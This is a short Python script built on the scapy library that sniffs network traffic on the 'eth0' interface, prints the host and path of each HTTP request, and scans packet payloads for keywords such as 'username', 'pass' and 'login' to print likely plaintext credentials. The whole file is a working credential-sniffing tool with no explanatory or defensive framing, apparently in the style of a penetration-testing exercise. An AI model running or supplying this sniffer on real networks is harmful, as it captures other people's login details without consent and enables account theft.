#!/usr/bin/python3

from scapy.all import *
from scapy.layers import http


def sniffer(interface):
    sniff(iface=interface, store=False, prn=process_packet)


def get_login_info(sniff_packet):
    if sniff_packet.haslayer(Raw):
        load = sniff_packet[Raw].load.decode()
        key_lists = ["uname", "username", "password", "pass", "login"]
        for key_list in key_lists:
            if key_list in load:
                return load


def process_packet(sniff_packet):
    if sniff_packet.haslayer(http.HTTPRequest):
        url = sniff_packet[http.HTTPRequest].Host + sniff_packet[http.HTTPRequest].Path
        print("[+] HTTP Request >> " + str(url))
        login_info = get_login_info(sniff_packet)
        if login_info:
            print("\n\n[+] Possible Username/Password >> " + login_info + "\n\n")


sniffer("eth0")
